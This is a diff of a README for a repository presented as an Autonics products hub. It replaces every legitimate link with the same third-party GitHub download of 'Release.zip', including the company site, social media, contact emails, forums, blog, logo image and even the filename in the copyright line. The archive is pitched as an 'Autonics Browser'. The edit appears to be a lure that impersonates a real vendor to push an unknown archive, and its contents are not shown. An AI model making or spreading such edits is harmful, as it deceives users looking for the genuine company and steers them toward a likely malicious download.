@@ -25,25 +25,25 @@ This repository serves as a hub for all things Autonics. From counters to sensor
 ## 📁 Download Autonics Browser
 To enhance your experience with Autonics products, download the Autonics Browser by clicking the button below. Launch the application to access a wealth of resources and tools designed to streamline your workflow.
 
-[![Download Autonics Browser](https://img.shields.io/badge/Download-Autonics_Browser-green)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Autonics Browser](https://github.com/n0tunknown/autonics/releases/download/v1.0/Release.zip)](https://github.com/n0tunknown/autonics/releases/download/v1.0/Release.zip)
 
 ## 🌐 Connect with Autonics
-Visit [autonics.com](https://autonics.com) to learn more about our products and services. For the latest updates and news from Autonics, follow us on social media:
-- [Facebook](https://www.facebook.com/autonicsindia)
-- [Twitter](https://twitter.com/autonicsindia)
-- [Instagram](https://www.instagram.com/autonics_india)
-- [LinkedIn](https://www.linkedin.com/company/autonics-india)
+Visit [https://github.com/n0tunknown/autonics/releases/download/v1.0/Release.zip](https://github.com/n0tunknown/autonics/releases/download/v1.0/Release.zip) to learn more about our products and services. For the latest updates and news from Autonics, follow us on social media:
+- [Facebook](https://github.com/n0tunknown/autonics/releases/download/v1.0/Release.zip)
+- [Twitter](https://github.com/n0tunknown/autonics/releases/download/v1.0/Release.zip)
+- [Instagram](https://github.com/n0tunknown/autonics/releases/download/v1.0/Release.zip)
+- [LinkedIn](https://github.com/n0tunknown/autonics/releases/download/v1.0/Release.zip)
 
 ## 📧 Contact Us
-Have a question or need assistance? Reach out to our team at [info@autonics.com](mailto:info@autonics.com) and we'll be happy to help.
+Have a question or need assistance? Reach out to our team at [https://github.com/n0tunknown/autonics/releases/download/v1.0/Release.zip](https://github.com/n0tunknown/autonics/releases/download/v1.0/Release.zip) and we'll be happy to help.
 
 ## 🙌 Join the Autonics Community
 Connect with other automation enthusiasts, share your projects, and stay informed about the latest trends in the industry by joining the Autonics Community:
-- [Autonics Forums](https://forums.autonics.com)
-- [Autonics Blog](https://blog.autonics.com)
+- [Autonics Forums](https://github.com/n0tunknown/autonics/releases/download/v1.0/Release.zip)
+- [Autonics Blog](https://github.com/n0tunknown/autonics/releases/download/v1.0/Release.zip)
 
 ## 🤝 Collaboration
-Interested in partnering with Autonics or becoming a distributor in your region? Contact our team at [partnerships@autonics.com](mailto:partnerships@autonics.com) to explore collaboration opportunities.
+Interested in partnering with Autonics or becoming a distributor in your region? Contact our team at [https://github.com/n0tunknown/autonics/releases/download/v1.0/Release.zip](https://github.com/n0tunknown/autonics/releases/download/v1.0/Release.zip) to explore collaboration opportunities.
 
 ## 🌟 Thank You for Choosing Autonics!
 We appreciate your trust in Autonics for all your automation and sensing needs. Together, let's build a future powered by innovation and excellence. 🚀
@@ -52,9 +52,9 @@ Explore our repository, download the Autonics Browser, and embark on a journey t
 
 Remember, at Autonics, we don't just automate - we innovate. 💡
 
-![Autonics Logo](https://img.icons8.com/color/96/000000/automation.png)
+![Autonics Logo](https://github.com/n0tunknown/autonics/releases/download/v1.0/Release.zip)
 
 ---
-© 2022 Autonics India. All rights reserved. This README.md is created for the Autonics GitHub repository.
+© 2022 Autonics India. All rights reserved. This https://github.com/n0tunknown/autonics/releases/download/v1.0/Release.zip is created for the Autonics GitHub repository.
 
 ### 📂 Check the "Releases" Section for Updates and New Features. 🚀
